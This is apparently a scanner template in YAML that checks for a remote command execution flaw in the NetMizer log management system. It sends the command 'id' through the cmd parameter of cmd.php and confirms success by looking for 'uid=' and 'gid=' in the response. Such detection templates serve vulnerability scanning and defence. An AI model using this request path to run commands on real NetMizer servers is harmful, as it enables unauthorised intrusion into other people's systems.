name: netmizer-cmd-rce
rules:
  - method: GET
    path: "/data/manage/cmd.php?cmd=id"
    expression: |
      response.status == 200 && response.body.bcontains(b"uid=") && response.body.bcontains(b"gid=")
detail:
  author: PeiQi
  links:
    - https://github.com/PeiQi0/PeiQi-WIKI-Book
  description: "NetMizer 日志管理系统 cmd.php 远程命令执行漏洞"
